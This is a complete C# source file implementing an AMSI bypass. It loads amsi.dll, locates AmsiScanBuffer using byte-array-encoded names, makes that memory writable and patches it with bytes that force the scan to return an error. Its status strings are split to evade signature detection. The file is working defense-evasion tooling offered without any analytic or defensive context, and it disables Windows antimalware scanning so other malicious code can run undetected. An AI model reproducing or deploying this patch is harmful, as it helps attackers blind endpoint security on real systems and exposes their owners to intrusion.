using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

public class Tinctura
{
    static byte[] DeeElEl = new byte[] { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
    static byte[] ScnBuffr = new byte[] { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };

    public static void Process()
    {
        try
        {
            Console.WriteLine(" ");
            Console.WriteLine("[x] At" + "tempt" + "ing " + "pa" + "tch...");
            Console.WriteLine(" ");

            // Load amsi.dll and get location of AmsiScanBuffer
            IntPtr lib = Win32.LoadLibrary(System.Text.Encoding.UTF8.GetString(DeeElEl, 0, DeeElEl.Length));
            IntPtr scanProc = Win32.GetProcAddress(lib, System.Text.Encoding.UTF8.GetString(ScnBuffr, 0, ScnBuffr.Length));

            var patchBytes = GetBytes;

            // Set region to RWX
            Win32.VirtualProtect(scanProc, (UIntPtr)patchBytes.Length, 0x40, out uint oldProtect);

            // Copy patch
            Marshal.Copy(patchBytes, 0, scanProc, patchBytes.Length);

            // Restore region to RX
            Win32.VirtualProtect(scanProc, (UIntPtr)patchBytes.Length, oldProtect, out uint del);

            Console.WriteLine(" ");
            Console.WriteLine("[x] Pat" + "ch" + " completed...");
            Console.WriteLine(" ");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    static byte[] GetBytes
    {
        get
        {
            if (Is64Bit)
            {
                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }

            return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        }
    }

    static bool Is64Bit
    {
        get
        {
            return IntPtr.Size == 8;
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}

